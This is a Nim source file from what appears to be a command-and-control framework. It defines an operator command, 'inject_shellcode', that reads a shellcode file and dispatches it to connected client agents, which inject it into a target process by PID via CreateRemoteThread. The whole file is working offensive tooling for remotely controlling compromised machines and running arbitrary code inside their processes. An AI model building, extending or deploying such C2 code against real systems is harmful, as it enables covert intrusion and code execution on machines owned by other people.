import std/[
  asyncdispatch, 
  tables
]

import system/io, json

import ../../types, ../../logging, ../../communication, ../../tasks

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if args.len < 2:
    errorLog "missing arguments, check 'help inject_shellcode'"
    return

  try:
    let shellcode = readFile(args[1])
    for client in server.cli.handlingClient:
      let task = await client.sendClientTask("inject_shellcode", @[ args[0], shellcode ])
      if not task.isNil(): 
        await task.awaitResponse()
        if not task.isError():
          successLog "injected " & $shellcode.len & " bytes in process with PID " & args[0]
        else:
          errorLog "error from agent: " & task.output.error

  except IOError:
    errorLog "Couldn't open file. Does it exist?"

let cmd*: Command = Command(
  execProc: execProc,
  name: "inject_shellcode",
  argsLength: 0,
  usage: @["inject_shellcode [PID] [PATH_TO_BIN_FILE]"],
  cliMode: @[ClientInteractMode],
  description: "Inject shellcode in a process using CreateRemoteThread",
  category: CCClientInteraction
)